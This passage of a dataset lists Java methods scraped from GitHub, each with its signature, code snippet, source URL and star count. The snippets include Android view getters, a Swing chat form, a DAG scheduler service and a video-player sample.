"method_name": "getContentLeft", "class_name": "CommonPagerTitleView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getContentLeft() {\n        if (mContentPositionDataProvider != null) {\n            return mContentPositionDataProvider.getContentLeft();\n        }\n        return getLeft();\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/titles/CommonPagerTitleView.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IMeasurablePagerTitleView"], "modifiers": ["public"]}}, {"id": 34949, "method_name": "getContentTop", "class_name": "CommonPagerTitleView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getContentTop() {\n        if (mContentPositionDataProvider != null) {\n            return mContentPositionDataProvider.getContentTop();\n        }\n        return getTop();\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/titles/CommonPagerTitleView.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IMeasurablePagerTitleView"], "modifiers": ["public"]}}, {"id": 34950, "method_name": "getContentRight", "class_name": "CommonPagerTitleView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getContentRight() {\n        if (mContentPositionDataProvider != null) {\n            return mContentPositionDataProvider.getContentRight();\n        }\n        return getRight();\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/titles/CommonPagerTitleView.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IMeasurablePagerTitleView"], "modifiers": ["public"]}}, {"id": 34951, "method_name": "getContentBottom", "class_name": "CommonPagerTitleView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getContentBottom() {\n        if (mContentPositionDataProvider != null) {\n            return mContentPositionDataProvider.getContentBottom();\n        }\n        return getBottom();\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/titles/CommonPagerTitleView.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IMeasurablePagerTitleView"], "modifiers": ["public"]}}, {"id": 34952, "method_name": "setContentView", "class_name": "CommonPagerTitleView", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setContentView(View contentView) {\n        setContentView(contentView, null);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/titles/CommonPagerTitleView.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IMeasurablePagerTitleView"], "modifiers": ["public"]}}, {"id": 34953, "method_name": "setContentView", "class_name": "CommonPagerTitleView", "params": ["View", "LayoutParams"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setContentView(View contentView, LayoutParams lp) {\n        removeAllViews();\n        if (contentView != null) {\n            if (lp == null) {\n                lp = new LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT);\n            }\n            addView(contentView, lp);\n        }\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/titles/CommonPagerTitleView.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IMeasurablePagerTitleView"], "modifiers": ["public"]}}, {"id": 34954, "method_name": "setContentView", "class_name": "CommonPagerTitleView", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setContentView(int layoutId) {\n        View child = LayoutInflater.from(getContext()).inflate(layoutId, null);\n        setContentView(child, null);\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/titles/CommonPagerTitleView.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IMeasurablePagerTitleView"], "modifiers": ["public"]}}, {"id": 34955, "method_name": "getOnPagerTitleChangeListener", "class_name": "CommonPagerTitleView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "OnPagerTitleChangeListener", "snippet": "    public OnPagerTitleChangeListener getOnPagerTitleChangeListener() {\n        return mOnPagerTitleChangeListener;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/titles/CommonPagerTitleView.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IMeasurablePagerTitleView"], "modifiers": ["public"]}}, {"id": 34956, "method_name": "setOnPagerTitleChangeListener", "class_name": "CommonPagerTitleView", "params": ["OnPagerTitleChangeListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOnPagerTitleChangeListener(OnPagerTitleChangeListener onPagerTitleChangeListener) {\n        mOnPagerTitleChangeListener = onPagerTitleChangeListener;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/titles/CommonPagerTitleView.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IMeasurablePagerTitleView"], "modifiers": ["public"]}}, {"id": 34957, "method_name": "getContentPositionDataProvider", "class_name": "CommonPagerTitleView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ContentPositionDataProvider", "snippet": "    public ContentPositionDataProvider getContentPositionDataProvider() {\n        return mContentPositionDataProvider;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/titles/CommonPagerTitleView.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IMeasurablePagerTitleView"], "modifiers": ["public"]}}, {"id": 34958, "method_name": "setContentPositionDataProvider", "class_name": "CommonPagerTitleView", "params": ["ContentPositionDataProvider"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setContentPositionDataProvider(ContentPositionDataProvider contentPositionDataProvider) {\n        mContentPositionDataProvider = contentPositionDataProvider;\n    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/view/magicindicator/buildins/commonnavigator/titles/CommonPagerTitleView.java", "stars": "1", "class_props": {"extends": "FrameLayout", "implements": ["IMeasurablePagerTitleView"], "modifiers": ["public"]}}, {"id": 34959, "method_name": "getId", "class_name": "ExecUser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getId() {\n        return id;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/exec/domain/ExecUser.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34960, "method_name": "setId", "class_name": "ExecUser", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setId(Integer id) {\n        this.id = id;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/exec/domain/ExecUser.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34961, "method_name": "getExecUser", "class_name": "ExecUser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getExecUser() {\n        return execUser;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/exec/domain/ExecUser.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34962, "method_name": "setExecUser", "class_name": "ExecUser", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setExecUser(String execUser) {\n        this.execUser = execUser;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/exec/domain/ExecUser.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34963, "method_name": "getDescription", "class_name": "ExecUser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getDescription() {\n        return description;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/exec/domain/ExecUser.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34964, "method_name": "setDescription", "class_name": "ExecUser", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDescription(String description) {\n        this.description = description;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/exec/domain/ExecUser.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34965, "method_name": "getCreateTime", "class_name": "ExecUser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "    public Date getCreateTime() {\n        return createTime;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/exec/domain/ExecUser.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34966, "method_name": "setCreateTime", "class_name": "ExecUser", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCreateTime(Date createTime) {\n        this.createTime = createTime;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/exec/domain/ExecUser.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34967, "method_name": "frame", "class_name": "ChatBox", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void frame()\n    {\n        java.awt.EventQueue.invokeLater(new Runnable() {\n            public void run() {\n                new ChatBox().setVisible(true);\n            }\n        });\n    }", "url": "https://raw.githubusercontent.com/itarunbisht/ReadMeTransfer/master/ChatBox.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 34968, "method_name": "initComponents", "class_name": "ChatBox", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void initComponents() {\n\n        jLabel1 = new javax.swing.JLabel();\n        jButton1 = new javax.swing.JButton();\n        jLabel2 = new javax.swing.JLabel();\n        jButton2 = new javax.swing.JButton();\n\n        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);\n\n        jLabel1.setText(\"Click to connect server\");\n\n        jButton1.setText(\"Server\");\n        jButton1.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jButton1ActionPerformed(evt);\n            }\n        });\n\n        jLabel2.setText(\"Click to connect client\");\n\n        jButton2.setText(\"Client\");\n        jButton2.addActionListener(new java.awt.event.ActionListener() {\n            public void actionPerformed(java.awt.event.ActionEvent evt) {\n                jButton2ActionPerformed(evt);\n            }\n        });\n\n        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());\n        getContentPane().setLayout(layout);\n        layout.setHorizontalGroup(\n            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGroup(layout.createSequentialGroup()\n                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n                    .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n                        .addGroup(layout.createSequentialGroup()\n                            .addGap(143, 143, 143)\n                            .addComponent(jLabel1, javax.swing.GroupLayout.PREFERRED_SIZE, 125, javax.swing.GroupLayout.PREFERRED_SIZE))\n                        .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()\n                            .addContainerGap()\n                            .addComponent(jLabel2, javax.swing.GroupLayout.PREFERRED_SIZE, 123, javax.swing.GroupLayout.PREFERRED_SIZE)))\n                    .addGroup(layout.createSequentialGroup()\n                        .addGap(163, 163, 163)\n                        .addComponent(jButton2, javax.swing.GroupLayout.PREFERRED_SIZE, 73, javax.swing.GroupLayout.PREFERRED_SIZE))\n                    .addGroup(layout.createSequentialGroup()\n                        .addGap(168, 168, 168)\n                        .addComponent(jButton1)))\n                .addContainerGap(132, Short.MAX_VALUE))\n        );\n        layout.setVerticalGroup(\n            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)\n            .addGroup(layout.createSequentialGroup()\n                .addGap(74, 74, 74)\n                .addComponent(jLabel1)\n                .addGap(18, 18, 18)\n                .addComponent(jButton1)\n                .addGap(36, 36, 36)\n                .addComponent(jLabel2)\n                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)\n                .addComponent(jButton2)\n                .addContainerGap(87, Short.MAX_VALUE))\n        );\n\n        pack();\n    }", "url": "https://raw.githubusercontent.com/itarunbisht/ReadMeTransfer/master/ChatBox.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 34969, "method_name": "jButton1ActionPerformed", "class_name": "ChatBox", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jButton1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton1ActionPerformed\n        Main m = new Main();        // TODO add your handling code here:\n    }", "url": "https://raw.githubusercontent.com/itarunbisht/ReadMeTransfer/master/ChatBox.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 34970, "method_name": "jButton2ActionPerformed", "class_name": "ChatBox", "params": ["java"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void jButton2ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton2ActionPerformed\n        // TODO add your handling code here:\n        Main m = new Main();\n    }", "url": "https://raw.githubusercontent.com/itarunbisht/ReadMeTransfer/master/ChatBox.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 34971, "method_name": "main", "class_name": "ChatBox", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String args[]) {\n        /* Set the Nimbus look and feel */\n        //<editor-fold defaultstate=\"collapsed\" desc=\" Look and feel setting code (optional) \">\n        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.\n         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html \n         */\n        try {\n            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {\n                if (\"Nimbus\".equals(info.getName())) {\n                    javax.swing.UIManager.setLookAndFeel(info.getClassName());\n                    break;\n                }\n            }\n        } catch (ClassNotFoundException ex) {\n            java.util.logging.Logger.getLogger(ChatBox.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);\n        } catch (InstantiationException ex) {\n            java.util.logging.Logger.getLogger(ChatBox.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);\n        } catch (IllegalAccessException ex) {\n            java.util.logging.Logger.getLogger(ChatBox.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);\n        } catch (javax.swing.UnsupportedLookAndFeelException ex) {\n            java.util.logging.Logger.getLogger(ChatBox.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);\n        }\n        //</editor-fold>\n\n        /* Create and display the form */\n//        java.awt.EventQueue.invokeLater(new Runnable() {\n//            public void run() {\n//                new ChatBox().setVisible(true);\n//            }\n//        });\n    }", "url": "https://raw.githubusercontent.com/itarunbisht/ReadMeTransfer/master/ChatBox.java", "stars": "1", "class_props": {"extends": "javax", "implements": null, "modifiers": ["public"]}}, {"id": 34972, "method_name": "startDag", "class_name": "DagService", "params": ["Dag"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void startDag(final Dag dag) {\n    this.executorService.submit(dag::start);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/dag/DagService.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34973, "method_name": "markNodeSuccess", "class_name": "DagService", "params": ["Node"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void markNodeSuccess(final Node node) {\n    this.executorService.submit(node::markSuccess);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/dag/DagService.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34974, "method_name": "markNodeKilled", "class_name": "DagService", "params": ["Node"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void markNodeKilled(final Node node) {\n    this.executorService.submit(node::markKilled);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/dag/DagService.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34975, "method_name": "markNodeFailed", "class_name": "DagService", "params": ["Node"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void markNodeFailed(final Node node) {\n    this.executorService.submit(node::markFailed);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/dag/DagService.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34976, "method_name": "killDag", "class_name": "DagService", "params": ["Dag"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void killDag(final Dag dag) {\n    this.executorService.submit(dag::kill);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/dag/DagService.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34977, "method_name": "shutdownAndAwaitTermination", "class_name": "DagService", "params": [], "throws": ["InterruptedException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void shutdownAndAwaitTermination() throws InterruptedException {\n    logger.info(\"DagService is shutting down.\");\n    this.executorServiceUtils.gracefulShutdown(this.executorService, SHUTDOWN_WAIT_TIMEOUT);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/dag/DagService.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34978, "method_name": "getExecutorService", "class_name": "DagService", "params": [], "throws": null, "modifiers": [], "return_type": "ExecutorService", "snippet": "  ExecutorService getExecutorService() {\n    return this.executorService;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/dag/DagService.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34979, "method_name": "main", "class_name": "Demo02Test", "params": ["String"], "throws": ["ParseException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) throws ParseException {\n        //1.\u4f7f\u7528Scanner\u7c7b\u4e2d\u7684\u65b9\u6cd5next,\u83b7\u53d6\u51fa\u751f\u65e5\u671f\n        Scanner sc = new Scanner(System.in);\n        System.out.println(\"\u8bf7\u8f93\u5165\u60a8\u7684\u51fa\u751f\u65e5\u671f,\u683c\u5f0f:yyyy-MM-dd\");\n        String birthdayDateString = sc.next();\n        //2.\u4f7f\u7528DateFormat\u7c7b\u4e2d\u7684\u65b9\u6cd5parse,\u628a\u5b57\u7b26\u4e32\u7684\u51fa\u751f\u65e5\u671f,\u89e3\u6790\u4e3aDate\u683c\u5f0f\u7684\u51fa\u751f\u65e5\u671f\n        SimpleDateFormat sdf = new SimpleDateFormat(\"yyyy-MM-dd\");\n        Date birthdayDate = sdf.parse(birthdayDateString);\n        //3.\u628aDate\u683c\u5f0f\u7684\u51fa\u751f\u65e5\u671f\u8f6c\u6362\u4e3a\u6beb\u79d2\u503c\n        long birthdayDateTime = birthdayDate.getTime();\n        //4.\u83b7\u53d6\u5f53\u524d\u7684\u65e5\u671f,\u8f6c\u6362\u4e3a\u6beb\u79d2\u503c\n        long todayTime = new Date().getTime();\n        //5.\u4f7f\u7528\u5f53\u524d\u65e5\u671f\u7684\u6beb\u79d2\u503c-\u51fa\u751f\u65e5\u671f\u7684\u6beb\u79d2\u503c\n        long time = todayTime-birthdayDateTime;\n        //6.\u628a\u6beb\u79d2\u5dee\u503c\u8f6c\u6362\u4e3a\u5929(s/1000/60/60/24)\n        System.out.println(time/1000/60/60/24);\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/12.%E3%80%90Object%E7%B1%BB%E3%80%81%E5%B8%B8%E7%94%A8API%E3%80%91-%E7%AC%94%E8%AE%B0/code/01_API/src/com/itheima/demo03/DateFormat/Demo02Test.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 34980, "method_name": "init", "class_name": "SampleControlVideo", "params": ["Context"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void init(Context context) {\n        super.init(context);\n        initView();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleControlVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 34981, "method_name": "initView", "class_name": "SampleControlVideo", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void initView() {\n        mMoreScale = (TextView) findViewById(R.id.moreScale);\n        mChangeRotate = (TextView) findViewById(R.id.change_rotate);\n        mChangeTransform = (TextView) findViewById(R.id.change_transform);\n\n        //\u5207\u6362\u6e05\u6670\u5ea6\n        mMoreScale.setOnClickListener(new OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                if (!mHadPlay) {\n                    return;\n                }\n                if (mType == 0) {\n                    mType = 1;\n                } else if (mType == 1) {\n                    mType = 2;\n                } else if (mType == 2) {\n                    mType = 3;\n                } else if (mType == 3) {\n                    mType = 4;\n                } else if (mType == 4) {\n                    mType = 0;\n                }\n                resolveTypeUI();\n            }\n        });\n\n        //\u65cb\u8f6c\u64ad\u653e\u89d2\u5ea6\n        mChangeRotate.setOnClickListener(new OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                if (!mHadPlay) {\n                    return;\n                }\n                if ((mTextureView.getRotation() - mRotate) == 270) {\n                    mTextureView.setRotation(mRotate);\n                    mTextureView.requestLayout();\n                } else {\n                    mTextureView.setRotation(mTextureView.getRotation() + 90);\n                    mTextureView.requestLayout();\n                }\n            }\n        });\n\n        //\u955c\u50cf\u65cb\u8f6c\n        mChangeTransform.setOnClickListener(new OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                if (!mHadPlay) {\n                    return;\n                }\n                if (mTransformSize == 0) {\n                    mTransformSize = 1;\n                } else if (mTransformSize == 1) {\n                    mTransformSize = 2;\n                } else if (mTransformSize == 2) {\n                    mTransformSize = 0;\n                }\n                resolveTransform();\n            }\n        });\n\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleControlVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 34982, "method_name": "onSurfaceSizeChanged", "class_name": "SampleControlVideo", "params": ["Surface", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onSurfaceSizeChanged(Surface surface, int width, int height) {\n        super.onSurfaceSizeChanged(surface, width, height);\n        resolveTransform();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleControlVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 34983, "method_name": "onSurfaceAvailable", "class_name": "SampleControlVideo", "params": ["Surface"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onSurfaceAvailable(Surface surface) {\n        super.onSurfaceAvailable(surface);\n        resolveRotateUI();\n        resolveTransform();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleControlVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 34984, "method_name": "resolveTransform", "class_name": "SampleControlVideo", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void resolveTransform() {\n        switch (mTransformSize) {\n            case 1: {\n                Matrix transform = new Matrix();\n                transform.setScale(-1, 1, mTextureView.getWidth() / 2, 0);\n                mTextureView.setTransform(transform);\n                mChangeTransform.setText(\"\u5de6\u53f3\u955c\u50cf\");\n                mTextureView.invalidate();\n            }\n            break;\n            case 2: {\n                Matrix transform = new Matrix();\n                transform.setScale(1, -1, 0, mTextureView.getHeight() / 2);\n                mTextureView.setTransform(transform);\n                mChangeTransform.setText(\"\u4e0a\u4e0b\u955c\u50cf\");\n                mTextureView.invalidate();\n            }\n            break;\n            case 0: {\n                Matrix transform = new Matrix();\n                transform.setScale(1, 1, mTextureView.getWidth() / 2, 0);\n                mTextureView.setTransform(transform);\n                mChangeTransform.setText(\"\u65cb\u8f6c\u955c\u50cf\");\n                mTextureView.invalidate();\n            }\n            break;\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleControlVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 34985, "method_name": "getLayoutId", "class_name": "SampleControlVideo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getLayoutId() {\n        return R.layout.sample_video;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleControlVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 34986, "method_name": "startWindowFullscreen", "class_name": "SampleControlVideo", "params": ["Context", "boolean", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "GSYBaseVideoPlayer", "snippet": "    public GSYBaseVideoPlayer startWindowFullscreen(Context context, boolean actionBar, boolean statusBar) {\n        SampleControlVideo sampleVideo = (SampleControlVideo) super.startWindowFullscreen(context, actionBar, statusBar);\n        sampleVideo.mSourcePosition = mSourcePosition;\n        sampleVideo.mType = mType;\n        sampleVideo.mTransformSize = mTransformSize;\n        //sampleVideo.resolveTransform();\n        sampleVideo.resolveTypeUI();\n        //sampleVideo.resolveRotateUI();\n        //\u8fd9\u4e2a\u64ad\u653e\u5668\u7684demo\u914d\u7f6e\u5207\u6362\u5230\u5168\u5c4f\u64ad\u653e\u5668\n        //\u8fd9\u53ea\u662f\u5355\u7eaf\u7684\u4f5c\u4e3a\u5168\u5c4f\u64ad\u653e\u663e\u793a\uff0c\u5982\u679c\u9700\u8981\u505a\u5927\u5c0f\u5c4f\u5e55\u5207\u6362\uff0c\u8bf7\u8bb0\u5f97\u5728\u8fd9\u91cc\u8036\u8bbe\u7f6e\u4e0a\u89c6\u9891\u5168\u5c4f\u7684\u9700\u8981\u7684\u81ea\u5b9a\u4e49\u914d\u7f6e\n        //\u6bd4\u5982\u5df2\u65cb\u8f6c\u89d2\u5ea6\u4e4b\u7c7b\u7684\u7b49\u7b49\n        //\u53ef\u53c2\u8003super\u4e2d\u7684\u5b9e\u73b0\n        return sampleVideo;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleControlVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 34987, "method_name": "resolveNormalVideoShow", "class_name": "SampleControlVideo", "params": ["View", "ViewGroup", "GSYVideoPlayer"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void resolveNormalVideoShow(View oldF, ViewGroup vp, GSYVideoPlayer gsyVideoPlayer) {\n        super.resolveNormalVideoShow(oldF, vp, gsyVideoPlayer);\n        if (gsyVideoPlayer != null) {\n            SampleControlVideo sampleVideo = (SampleControlVideo) gsyVideoPlayer;\n            mSourcePosition = sampleVideo.mSourcePosition;\n            mType = sampleVideo.mType;\n            mTransformSize = sampleVideo.mTransformSize;\n            resolveTypeUI();\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleControlVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 34988, "method_name": "resolveRotateUI", "class_name": "SampleControlVideo", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void resolveRotateUI() {\n        if (!mHadPlay) {\n            return;\n        }\n        mTextureView.setRotation(mRotate);\n        mTextureView.requestLayout();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/video/SampleControlVideo.java", "stars": "2", "class_props": {"extends": "StandardGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 34989, "method_name": "resolveTypeUI", "class_name": "SampleControlVideo", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void resolveTypeUI() 